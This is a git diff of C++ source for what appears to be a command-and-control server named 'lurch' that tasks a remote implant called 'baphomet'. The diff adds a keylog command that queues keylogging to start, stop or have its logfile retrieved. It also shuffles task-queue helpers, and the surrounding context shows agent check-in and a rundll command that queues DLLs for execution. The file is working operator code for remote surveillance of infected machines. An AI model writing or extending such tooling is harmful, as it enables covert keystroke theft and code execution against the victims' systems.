@@ -1,9 +1,52 @@
 //
-// Created by diago on 2024-06-06.
+// Created by diago on 2024-06-18.
 //
 
 #include <baphomet.hpp>
 #include <components.hpp>
+
+
+lurch::result<std::string>
+lurch::baphomet::generic_queue_task(
+        const command &cmd,
+        std::vector<std::string> args,
+        const std::string &queue_message
+    ) {
+
+    args.insert(args.begin(), cmd.name);
+    return delimit_command(args)
+        .and_then([&](std::string task_str) {
+            tasks.push(task_str);
+            return result<std::string>(queue_message);
+        })
+        .or_else([&](std::string err) {
+            return result<std::string>(error(err));
+        });
+}
+
+
+lurch::result<std::string>
+lurch::baphomet::get_task(reciever_context& ctx) const {
+
+    ctx.log_if_error = false;
+    if(tasks.empty()) {
+        return error("no tasks available.");
+    }
+
+    const std::string task = tasks.front();
+    return { task };
+}
+
+
+lurch::result<std::string>
+lurch::baphomet::complete_task(reciever_context& ctx) {
+    if(tasks.empty()) {
+        return error("no tasks to be completed.");
+    }
+
+    tasks.pop();
+    return OBJECT_EMPTY_RESPONSE;
+}
 
 
 lurch::result<std::string>
@@ -118,6 +161,42 @@ lurch::baphomet::checkin(reciever_context &ctx) {
 
     return { io::format_str("Baphomet agent checked in from: {}", ctx.address) };
 }
+
+
+lurch::result<std::string>
+lurch::baphomet::keylog(reciever_context &ctx) {
+
+    const auto [start, stop, get] =
+        ctx.cmd.get<empty>("--start", "-st")
+            .with<empty>("--stop", "-sp")
+            .with<empty>("--get", "-g")
+            .done();
+
+
+    size_t arg_cnt = 0;
+
+    if(start)
+        ++arg_cnt;
+    if(stop)
+        ++arg_cnt;
+    if(get)
+        ++arg_cnt;
+
+    if(arg_cnt != 1) {
+        return error("Please provide exactly one argument.");
+    }
+
+
+    if(start) {
+        return generic_queue_task(ctx.cmd, {"start"}, "Queued keylogging to begin.");
+    }
+    if(stop) {
+        return generic_queue_task(ctx.cmd, {"stop"}, "Queued keylogging to be stopped.");
+    }
+
+    return generic_queue_task(ctx.cmd, {"get"}, "Queued the logfile to be retrieved.");
+}
+
 
 
 lurch::result<std::string>
@@ -269,134 +348,4 @@ lurch::baphomet::rundll(reciever_context& ctx) {
         { file_name },
         "Successfully queued DLL to be executed."
     );
-}
-
-
-lurch::result<std::string>
-lurch::baphomet::print_tasks() const {
-
-    //
-    // std::queue does not have iterators.
-    // we need to create a copy and pop each element one by one.
-    //
-
-    std::queue copy_queue(tasks);
-    std::string buff;
-
-    while(!copy_queue.empty()) {
-        buff += copy_queue.front() + '\n';
-        copy_queue.pop();
-    }
-
-    if(buff.empty()) {
-        return error("no tasks available.");
-    }
-
-    buff.pop_back();
-    return { buff };
-}
-
-
-lurch::result<std::string>
-lurch::baphomet::generic_queue_task(
-        const command &cmd,
-        std::vector<std::string> args,
-        const std::string &queue_message
-    ) {
-
-    args.insert(args.begin(), cmd.name);
-    return delimit_command(args)
-        .and_then([&](std::string task_str) {
-            tasks.push(task_str);
-            return result<std::string>(queue_message);
-        })
-        .or_else([&](std::string err) {
-            return result<std::string>(error(err));
-        });
-}
-
-
-lurch::result<std::string>
-lurch::baphomet::print_staged_files() const {
-
-    if(const auto file_list = inst->db.fileman_get_file_list(id)) {
-        std::string result;
-        for(const auto& path : *file_list) {
-            result += path.string() + '\n';
-        }
-
-        result.pop_back(); //remove trailing \n char
-        return { result };
-    }
-    else {
-        return file_list.error();
-    }
-}
-
-
-lurch::result<std::string>
-lurch::baphomet::clear_tasks() {
-    if(tasks.empty()) {
-        return error("no tasks exist");
-    }
-
-    while(!tasks.empty())
-        tasks.pop();
-
-    return { "cleared tasks." };
-}
-
-
-bool
-lurch::baphomet::file_is_staged(const std::string &file_name) const {
-
-    if(const auto file_list = inst->db.fileman_get_file_list(id)) {
-        for(const auto& file : *file_list) {
-            if(file_name == file) {
-                return true;
-            }
-        }
-    }
-
-    return false;
-}
-
-
-lurch::result<std::string>
-lurch::baphomet::get_task(reciever_context& ctx) const {
-
-    ctx.log_if_error = false;
-    if(tasks.empty()) {
-        return error("no tasks available.");
-    }
-
-    const std::string task = tasks.front();
-    return { task };
-}
-
-
-lurch::result<std::string>
-lurch::baphomet::complete_task(reciever_context& ctx) {
-    if(tasks.empty()) {
-        return error("no tasks to be completed.");
-    }
-
-    tasks.pop();
-    return OBJECT_EMPTY_RESPONSE;
-}
-
-
-lurch::result<std::string>
-lurch::baphomet::delimit_command(const std::vector<std::string> &strings) {
-
-    std::string buff;
-    for(const auto& str : strings) {
-        if(str.find_first_of(AGENT_DELIMITING_CHAR) != std::string::npos) {
-            return error("couldn't format command, invalid character used.");
-        }
-
-        buff += str + AGENT_DELIMITING_CHAR;
-    }
-
-    return { buff };
 }
